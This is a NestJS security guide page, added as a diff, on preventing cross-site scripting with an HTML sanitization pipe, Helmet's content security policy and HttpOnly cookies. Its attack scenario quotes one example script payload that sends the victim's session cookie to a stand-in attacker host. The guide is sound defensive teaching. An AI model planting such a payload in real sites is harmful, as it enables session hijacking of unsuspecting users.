@@ -1,0 +1,92 @@
+---
+title: "XSS Prevention"
+description: "XSS Prevention in NestJS"
+importance: "HIGH"
+revisionTime: 11
+category: "NestJS"
+subcategory: "Security"
+order: 2600
+---
+
+*Cross-Site Scripting (XSS) is a vulnerability where an attacker injects malicious JavaScript into an application. When other users view the application, their browser executes the attacker's script, often resulting in stolen session cookies or unauthorized actions.*
+
+## Overview
+XSS is fundamentally a frontend vulnerability (it happens in the browser), but the backend (NestJS) is responsible for storing and returning the malicious payload.
+
+**The Attack Scenario:**
+1. Attacker updates their profile bio to: `<script>fetch('evil.com?cookie=' + document.cookie)</script>`
+2. NestJS saves this string to the database.
+3. Another user visits the attacker's profile.
+4. NestJS returns the malicious string.
+5. The frontend (e.g., React, Vue) renders the string directly into the HTML DOM.
+6. The victim's browser executes the script, stealing their session cookie.
+
+## Key Concepts
+- **Stored XSS**: The malicious script is saved in the database (e.g., a blog comment) and served to all users.
+- **Reflected XSS**: The malicious script is embedded in the URL (e.g., `?search=<script>...`) and the server echoes it back in the HTML response.
+- **Sanitization vs Escaping**: 
+  - *Escaping* converts `<` to `&lt;` so the browser renders it as text, not HTML. (Best done by the frontend).
+  - *Sanitization* removes dangerous HTML tags (like `<script>`) but keeps safe tags (like `<b>`). (Best done by the backend).
+
+## Code Examples
+
+### 1. Sanitizing Input in NestJS
+If your application accepts rich text (e.g., a blog post written in a WYSIWYG editor), you *must* sanitize the HTML on the backend before saving it to the database.
+
+Do not write your own RegEx! Use a proven library like `DOMPurify` or `xss`.
+
+```bash
+npm install xss
+```
+
+```typescript
+// sanitize.pipe.ts
+import { PipeTransform, Injectable, ArgumentMetadata } from '@nestjs/common';
+import * as xss from 'xss';
+
+@Injectable()
+export class SanitizeHtmlPipe implements PipeTransform {
+  transform(value: any, metadata: ArgumentMetadata) {
+    if (typeof value === 'string') {
+      // Strips out <script>, onclick handlers, and iframe tags.
+      // Keeps safe tags like <b>, <i>, <p>.
+      return xss.filterXSS(value);
+    }
+    
+    if (typeof value === 'object' && value !== null) {
+      // Recursively sanitize objects
+      for (const key in value) {
+        value[key] = this.transform(value[key], metadata);
+      }
+    }
+    
+    return value;
+  }
+}
+```
+
+Apply the pipe globally or to specific endpoints:
+```typescript
+@Post('comments')
+@UsePipes(new SanitizeHtmlPipe())
+createComment(@Body() commentDto: CreateCommentDto) {
+  // commentDto.html_content is now 100% safe to save to the database.
+  return this.db.save(commentDto);
+}
+```
+
+### 2. Using Helmet for CSP
+Content Security Policy (CSP) is the ultimate defense against XSS. Even if an attacker successfully injects a `<script>` tag into your HTML, a strict CSP will instruct the browser *not* to execute it.
+
+```typescript
+// main.ts
+import helmet from 'helmet';
+
+// Apply helmet globally
+app.use(helmet()); 
+// By default, Helmet's CSP prevents inline scripts from executing!
+```
+
+## Best Practices
+- **Rely on the Frontend**: Modern frontend frameworks (React, Vue, Angular) automatically escape variables by default (e.g., `{user.bio}` in React). You only run into XSS issues if you bypass this protection (e.g., using `dangerouslySetInnerHTML`). The backend should focus on validating data types, while the frontend focuses on safe rendering.
+- **HttpOnly Cookies**: If you store authentication tokens (JWTs or Session IDs) in cookies, always set the `HttpOnly` flag. This prevents JavaScript from reading the cookie (`document.cookie` will return empty). Even if an attacker executes an XSS script, they cannot steal the user's session token!
